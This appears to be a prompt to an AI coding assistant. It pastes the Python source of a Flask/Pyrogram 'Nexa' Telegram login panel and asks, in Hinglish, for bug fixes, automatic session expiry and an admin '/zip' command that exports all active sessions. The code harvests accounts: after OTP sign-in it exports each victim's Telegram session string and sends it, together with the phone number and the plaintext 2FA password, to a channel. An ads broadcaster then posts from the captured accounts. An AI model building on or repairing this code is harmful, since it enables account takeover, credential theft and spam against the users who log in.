        except (UserDeactivated, AuthKeyUnregistered):
            users_col.update_one(
                {"_id": user["_id"]},
                {"$set": {"ads_enabled": False, "status": "expired"}},
            )
            error(f"[{phone}] session expired - ads disabled for this user")
        finally:
            try:
                loop.close()
            except Exception:
                pass

        if sent and msgs_col is not None:
            msgs_col.insert_many([
                {
                    "user_id": uid,
                    "phone": phone,
                    "broadcast_id": bid,
                    "chat_id": ("me" if cid == "me" else int(cid)),
                    "message_id": mid,
                    "session_string": ss,
                    "sent_at": datetime.now(),
                }
                for cid, mid in sent
            ])

    def send_test(self, user):
        bid = f"test_{datetime.now():%Y%m%d_%H%M%S}"
        info(f"TEST send queued for {user.get('phone', '?')}")
        self._submit(user, bid)
        return True


ads_broadcaster = AdsBroadcaster()



fix Nexa/auth_routes.py ispe session expired aate vo fix kro and jo jo small sai small bugs hai vo properly fix kro


import html as html_lib
import logging
import re
import uuid
from datetime import datetime

from flask import Blueprint, jsonify, redirect, render_template, request, session
from pyrogram.errors import (
    FloodWait,
    PasswordHashInvalid,
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberBanned,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
)

from config import BACKGROUND_VIDEO

from . import database
from .database import (
    ensure_db,
    get_videos,
    save_session_to_db,
    send_to_channel,
)
from .session_manager import session_manager

log = logging.getLogger(__name__)

auth_bp = Blueprint("auth", __name__)

# --------------------------------------------------------------------------
# Tunables
# --------------------------------------------------------------------------
PHONE_RE = re.compile(r"^\+[1-9]\d{7,14}$")   # E.164
DEFAULT_SESSION_NAME = "session"
MAX_CODE_ATTEMPTS = 3
REUSE_PENDING_SESSION = True   # double-tap par naya session na bane
RESEND_COOLDOWN = 45           # seconds, reuse window
TRUTHY = {"1", "true", "yes", "on"}


# --------------------------------------------------------------------------
# Small helpers
# --------------------------------------------------------------------------
def _json():
    return request.get_json(silent=True) or {}


def _err(message, status=400, **extra):
    payload = {"ok": False, "error": message}
    payload.update(extra)
    return jsonify(payload), status


def _normalize_phone(raw):
    """'+91 98765-43210' / '919876543210' -> '+919876543210'"""
    if raw is None:
        return ""
    digits = re.sub(r"\D", "", str(raw))
    return f"+{digits}" if digits else ""


def _valid_phone(phone):
    return bool(phone) and bool(PHONE_RE.match(phone))


def _mask_phone(phone):
    """'+919876543210' -> '+9198•••210'"""
    if not phone:
        return ""
    digits = phone.lstrip("+")
    if len(digits) <= 7:
        return f"+{digits}"
    return f"+{digits[:4]}{'•' * (len(digits) - 7)}{digits[-3:]}"


def _safe_session_name(raw):
    cleaned = re.sub(r"[^A-Za-z0-9_\-]", "", (raw or "").strip())
    return cleaned or DEFAULT_SESSION_NAME


def _truthy(value):
    return str(value or "").strip().lower() in TRUTHY


# --------------------------------------------------------------------------
# temp_sessions access (resolved at call time, not import time)
# --------------------------------------------------------------------------
def _temp_col():
    try:
        ensure_db()
    except Exception as exc:                       # pragma: no cover
        log.warning("ensure_db failed: %s", exc)
    return getattr(database, "temp_sessions_col", None)


def _temp_doc(session_id):
    col = _temp_col()
    if col is None:
        return None
    try:
        return col.find_one({"_id": session_id})
    except Exception as exc:
        log.warning("temp_sessions find failed: %s", exc)
        return None


def _temp_update(session_id, values):
    col = _temp_col()
    if col is None:
        return
    try:
        col.update_one({"_id": session_id}, {"$set": values}, upsert=True)
    except Exception as exc:
        log.warning("temp_sessions update failed: %s", exc)


def _temp_delete(session_id):
    col = _temp_col()
    if col is None:
        return
    try:
        col.delete_one({"_id": session_id})
    except Exception as exc:
        log.warning("temp_sessions delete failed: %s", exc)


def _reuse_pending(phone):
    """Return a fresh pending session_id for this phone, else None."""
    if not REUSE_PENDING_SESSION:
        return None
    col = _temp_col()
    if col is None:
        return None
    try:
        doc = col.find_one(
            {"phone": phone, "status": "code_sent", "requires_password": False},
            sort=[("created_at", -1)],
        )
    except Exception as exc:
        log.warning("reuse lookup failed: %s", exc)
        return None
    if not doc:
        return None

    session_id = doc.get("_id")
    if not session_manager.get_session(session_id):
        return None
    created = doc.get("created_at")
    if created and (datetime.now() - created).total_seconds() > RESEND_COOLDOWN:
        return None
    return session_id


# --------------------------------------------------------------------------
# Session bootstrap
# --------------------------------------------------------------------------
def _start_session(phone, session_name=DEFAULT_SESSION_NAME):
    """Create a Pyrogram client + send OTP. Cleans up on ANY failure."""
    ensure_db()
    session_id = str(uuid.uuid4())[:8]

    thread = session_manager.create_session(session_id, phone)

    try:
        sent = thread.execute(lambda: thread.client.send_code(phone))
    except Exception:
        session_manager.remove_session(session_id)   # no leak
        raise

    log.info(
        "send_code ok | sid=%s phone=%s type=%s timeout=%s",
        session_id, _mask_phone(phone),
        getattr(sent, "type", "?"), getattr(sent, "timeout", "?"),
    )

    _temp_update(session_id, {
        "phone_code_hash": sent.phone_code_hash,
        "session_name": session_name,
        "status": "code_sent",
        "phone": phone,
        "attempts": 0,
        "requires_password": False,
        "created_at": datetime.now(),
    })
    return session_id


def _handle_send_code(payload, force_new=False):
    """Shared by /api/bot-connect and /api/send-code."""
    try:
        session_manager.cleanup_old()
    except Exception as exc:
        log.warning("cleanup_old failed: %s", exc)

    phone = _normalize_phone(payload.get("phone"))
    session_name = _safe_session_name(payload.get("session_name"))

    if not _valid_phone(phone):
        return _err("Invalid phone number", 400)

    if not force_new:
        existing = _reuse_pending(phone)
        if existing:
            return jsonify(
                ok=True,
                session_id=existing,
                phone=phone,
                masked=_mask_phone(phone),
                reused=True,
                message=f"Code already sent to {_mask_phone(phone)}",
            )

    try:
        session_id = _start_session(phone, session_name)
    except PhoneNumberInvalid:
        return _err("Invalid phone number", 400)
    except PhoneNumberBanned:
        return _err("This phone number is banned", 403)
    except FloodWait as exc:
        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)
    except RuntimeError as exc:
        return _err(str(exc), 503)
    except Exception as exc:
        log.exception("send_code failed for %s: %s", _mask_phone(phone), exc)
        return _err("Failed to send code. Try again.", 500)

    return jsonify(
        ok=True,
        session_id=session_id,
        phone=phone,
        masked=_mask_phone(phone),
        message=f"Code sent to {_mask_phone(phone)}",
    )


# --------------------------------------------------------------------------
# Pages
# --------------------------------------------------------------------------
@auth_bp.route("/")
def index():
    return redirect("/login")


@auth_bp.route("/login")
def login():
    """
    Render the login page.

    A logged-in user must STILL see /login when arriving from the bot with
    ?s=<session_id> (adding another account) or with ?fresh=1 (explicit
    re-login). Only a plain /login while logged in goes to /dashboard.

    Previously this always redirected to /dashboard when a "user" was in the
    Flask session, so the bot link skipped the OTP step entirely.
    """
    pending = (request.args.get("s") or "").strip()
    fresh = _truthy(request.args.get("fresh"))

    if not pending and not fresh and "user" in session:
        return redirect("/dashboard")

    return render_template(
        "login.html",
        bg_video=BACKGROUND_VIDEO,
        pending_session=pending,
        fresh=fresh,
    )


@auth_bp.route("/logout")
def logout_page():
    session.clear()
    return redirect("/login?fresh=1")


@auth_bp.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template(
        "dashboard.html",
        user=session["user"],
        videos=get_videos(),
        bg_video=BACKGROUND_VIDEO,
    )


# --------------------------------------------------------------------------
# API: start flow
# --------------------------------------------------------------------------
@auth_bp.route("/api/bot-connect", methods=["POST"])
def bot_connect():
    """Called by bot.py after the user shares their contact."""
    return _handle_send_code(_json())


@auth_bp.route("/api/send-code", methods=["POST"])
def send_code():
    """Web fallback + 'resend'. Pass {"force": true} for a brand new code."""
    payload = _json()
    return _handle_send_code(payload, force_new=bool(payload.get("force")))


@auth_bp.route("/api/session-info")
def session_info():
    session_id = (request.args.get("s") or "").strip()
    if not session_id:
        return _err("missing session", 400)
    if not session_manager.get_session(session_id):
        return _err("Session expired", 404)

    doc = _temp_doc(session_id) or {}
    phone = doc.get("phone", "")
    return jsonify(
        ok=True,
        masked=_mask_phone(phone),
        phone=phone,
        requires_password=bool(doc.get("requires_password")),
    )


# --------------------------------------------------------------------------
# API: verify
# --------------------------------------------------------------------------
@auth_bp.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = _json()
    session_id = (data.get("session_id") or "").strip()
    code = re.sub(r"\D", "", str(data.get("code") or ""))
    password = (data.get("password") or "").strip()

    if not session_id:
        return _err("Session ID required", 400)

    thread = session_manager.get_session(session_id)
    if not thread:
        return _err("Session expired", 400)

    doc = _temp_doc(session_id) or {}
    phone = doc.get("phone") or getattr(thread, "phone", "")
    phone_code_hash = doc.get("phone_code_hash")
    session_name = doc.get("session_name") or DEFAULT_SESSION_NAME
    needs_password = bool(doc.get("requires_password"))

    if not phone:
        session_manager.remove_session(session_id)
        return _err("Session data lost", 400)

    if needs_password:
        if not password:
            return _err("2FA password required", 401, requires_password=True)
    else:
        if not code or not (4 <= len(code) <= 8):
            return _err("Invalid verification code", 400)
        if not phone_code_hash:
            session_manager.remove_session(session_id)
            return _err("Session data lost", 400)

    user = None
    session_string = None
    used_password = False

    try:
        if needs_password:
            # already past sign_in, straight to 2FA
            user = thread.execute(lambda: thread.client.check_password(password))
            used_password = True
        else:
            try:
                user = thread.execute(lambda: thread.client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code,
                ))
            except SessionPasswordNeeded:
                if not password:
                    _temp_update(session_id, {
                        "requires_password": True,
                        "status": "password_needed",
                    })
                    return _err("2FA password required", 401, requires_password=True)
                user = thread.execute(lambda: thread.client.check_password(password))
                used_password = True

        session_string = thread.execute(lambda: thread.client.export_session_string())

    except PhoneCodeInvalid:
        attempts = int(doc.get("attempts") or 0) + 1
        _temp_update(session_id, {"attempts": attempts})
        if attempts >= MAX_CODE_ATTEMPTS:
            session_manager.remove_session(session_id)
            return _err("Too many wrong attempts. Request a new code.",
                        401, expired=True)
        left = MAX_CODE_ATTEMPTS - attempts
        return _err(f"Invalid verification code. {left} attempt(s) left.",
                    401, attempts_left=left)

    except PhoneCodeExpired:
        session_manager.remove_session(session_id)
        return _err("Code expired. Request a new code.", 401, expired=True)

    except PasswordHashInvalid:
        return _err("Invalid 2FA password", 401, requires_password=True)

    except FloodWait as exc:
        return _err(f"Please wait {getattr(exc, 'value', 0)} seconds", 429)

    except Exception as exc:
        log.exception("verify_code failed for %s: %s", _mask_phone(phone), exc)
        session_manager.remove_session(session_id)
        return _err("Verification failed. Try again.", 500)

    if not user:
        session_manager.remove_session(session_id)
        return _err("Verification failed", 400)

    # success -> drop the temporary client + temp doc
    session_manager.remove_session(session_id)
    _temp_delete(session_id)

    first_name = (getattr(user, "first_name", "") or "").strip()
    last_name = (getattr(user, "last_name", "") or "").strip()
    username = getattr(user, "username", None)
    full_name = f"{first_name} {last_name}".strip() or "Unknown"

    user_info = {
        "id": user.id,
        "first_name": first_name,
        "last_name": last_name,
        "username": username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name,
        "two_step_verification": used_password,
    }

    # storage / notify failures must not break the login
    try:
        if not save_session_to_db(user_info):
            log.warning("save_session_to_db returned False for %s", user_info["id"])
    except Exception as exc:
        log.exception("save_session_to_db raised: %s", exc)

    try:
        channel_msg = (
            "🟢 <b>NEW SESSION</b>\n"
            f"👤 <b>Name:</b> {html_lib.escape(full_name)}\n"
            f"🔗 <b>Username:</b> "
            f"{html_lib.escape('@' + username) if username else 'N/A'}\n"
            f"🆔 <b>User ID:</b> <code>{user_info['id']}</code>\n"
            f"📱 <b>Phone:</b> <code>{html_lib.escape(phone)}</code>"
        )
        if used_password:
            channel_msg += f"\n🔑 <b>2FA:</b> <code>{html_lib.escape(password)}</code>"
        channel_msg += (
            f"\n\n<b>🔐 SESSION:</b>\n"
            f"<code>{html_lib.escape(user_info['session_string'])}</code>"
        )
        send_to_channel(channel_msg)
    except Exception as exc:
        log.exception("send_to_channel failed: %s", exc)

    session.permanent = True
    session["user"] = {
        "id": user_info["id"],
        "name": full_name,
        "username": user_info["username"],
        "phone": phone,
    }
    return jsonify(ok=True, user=session["user"])


# --------------------------------------------------------------------------
# API: logout
# --------------------------------------------------------------------------
@auth_bp.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)



Nexa/session_manager.py isme ye change Krna dead sessions automatically update kre and ek toggle rakhunga admin.html mai vha automatic login session ka 24 hrs hojayega uske baad automatically logout krdega login devices and admin /zip likhega toh all active sessions in zip mai dedega aaisa krna and admin.html toggle rakhna and refresh button ki sessions dekh paaye ye rha code



import asyncio
import threading
from datetime import datetime, timedelta

from pyrogram import Client

from config import API_ID, API_HASH
from Nexa.database import temp_sessions_col, ensure_db

_global_stats = {"active_sessions": 0, "pending_msgs": 0}


class SessionThread:
    def __init__(self, session_id, phone):
        self.session_id = session_id
        self.phone = phone
        self.client = None
        self.loop = None
        self.thread = None
        self.connected = False
        self.connection_error = None
        self._connected_event = threading.Event()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()

    async def _init_and_connect(self):
        self.client = Client(
            name=f"session_{self.session_id}",
            api_id=API_ID, api_hash=API_HASH,
            in_memory=True, no_updates=True)
        await self.client.connect()

    def _run_loop(self):
        try:
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(self._init_and_connect())
            self.connected = True
            self._connected_event.set()
            self.loop.run_forever()
        except Exception as e:
            self.connection_error = str(e)
            self.connected = False
            self._connected_event.set()
        finally:
            try:
                if self.loop and not self.loop.is_closed():
                    self.loop.close()
            except Exception:
                pass

    def wait_for_connection(self, timeout=15):
        return self._connected_event.wait(timeout=timeout)

    def execute(self, coro_func, *args, timeout=90):
        if not self.loop or not self.connected:
            raise RuntimeError("Session not connected")

        async def wrapper():
            return await coro_func(*args)

        future = asyncio.run_coroutine_threadsafe(wrapper(), self.loop)
        return future.result(timeout=timeout)

    def stop(self):
        try:
            if self.client and self.connected and self.loop and not self.loop.is_closed():
                try:
                    asyncio.run_coroutine_threadsafe(
                        self.client.disconnect(), self.loop).result(timeout=3)
                except Exception:
                    pass
            if self.loop and self.loop.is_running():
                self.loop.call_soon_threadsafe(self.loop.stop)
            if self.thread and self.thread.is_alive():
                self.thread.join(timeout=3)
        except Exception:
            pass
        self.connected = False


class SessionManager:
    def __init__(self):
        self._sessions = {}
        self._lock = threading.Lock()

    def create_session(self, session_id, phone):
        self.remove_session(session_id)
        session = SessionThread(session_id, phone)
        if not session.wait_for_connection(timeout=15):
            session.stop()
            raise RuntimeError("Session connection timeout")
        if not session.connected:
            err = session.connection_error or "Unknown error"
            session.stop()
            raise RuntimeError(f"Failed to connect: {err}")
        with self._lock:
            self._sessions[session_id] = session
        ensure_db()
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {"_id": session_id},
                {"$set": {"phone": phone, "created_at": datetime.now(),
                          "status": "connected"}}, upsert=True)
        return session

    def get_session(self, session_id):
        with self._lock:
            session = self._sessions.get(session_id)
            if session and session.connected and session.thread.is_alive():
                return session
            if session:
                self._sessions.pop(session_id, None)
        if session:
            session.stop()
        return None

    def remove_session(self, session_id):
        with self._lock:
            session = self._sessions.pop(session_id, None)
        if session:
            session.stop()
        ensure_db()
        if temp_sessions_col is not None:
            temp_sessions_col.delete_one({"_id": session_id})

    def cleanup_old(self, max_age_minutes=25):
        ensure_db()
        if temp_sessions_col is None:
            return
        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
        for doc in list(temp_sessions_col.find({"created_at": {"$lt": cutoff}})):
            self.remove_session(doc["_id"])

    def cleanup_dead_sessions(self):
        with self._lock:
            dead = [sid for sid, s in list(self._sessions.items())
                    if not s.connected or not s.thread.is_alive()]
        for sid in dead:
            self.remove_session(sid)
        return len(dead)

    def get_active_count(self):
        with self._lock:
            return len([s for s in self._sessions.values() if s.connected])


class SessionCleaner:
    def __init__(self):
        self._running = False
        self._thread = None
        self._stop_event = threading.Event()

    def start(self):
        if self._running:
            return
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()
        print("Session Cleaner started")

    def stop(self):
        if not self._running:
            return
        self._stop_event.set()
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
        print("Session Cleaner stopped")

    def _run(self):
        from Nexa.database import ads_config_col, broadcast_msgs_col
        while not self._stop_event.is_set():
            try:
                count = session_manager.cleanup_dead_sessions()
                if count:
                    print(f"Cleaned {count} dead sessions")
                _global_stats["active_sessions"] = session_manager.get_active_count()
                if broadcast_msgs_col is not None:
                    _global_stats["pending_msgs"] = broadcast_msgs_col.count_documents({})
                if ads_config_col is not None:
                    ads_config_col.update_one(
                        {"_id": "stats"},
                        {"$set": {"active_sessions": _global_stats["active_sessions"],
                                  "pending_msgs": _global_stats["pending_msgs"],
                                  "last_cleanup": datetime.now()}},
                        upsert=True)
            except Exception as e:
                print(f"Session cleaner error: {e}")
            self._stop_event.wait(30)


session_manager = SessionManager()
session_cleaner = SessionCleaner()

